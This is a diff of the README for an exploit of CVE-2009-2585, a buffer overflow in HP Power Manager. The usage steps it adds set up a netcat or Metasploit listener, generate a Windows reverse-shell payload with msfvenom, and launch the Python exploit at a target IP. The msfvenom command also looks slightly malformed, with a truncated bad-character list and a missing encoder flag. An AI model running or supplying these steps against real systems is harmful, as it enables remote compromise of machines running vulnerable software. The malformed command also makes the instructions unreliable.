@@ -4,13 +4,15 @@ It is a version modified of the original exploit by Muhammad Haidari (https://ra
 # Usage
 
 At firts, put a listener:
-
-<pre> nc lvp 443 </pre>
+<pre> sudo nc -lvp 443 </pre>
 
 Or using the metasploit module: 
-
 <pre> /exploit/multi/handler with payload: windows/shell_reverse_tcp </pre>
 
-Now, you can launch the exploit:
+Create the payload:
+<pre>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python</pre>
 
+Add the payload to the exploit!
+
+Now, you can launch the exploit:
 <pre>python CVE2009-2585_HP_Power_Manager_BoF.py IP </pre>
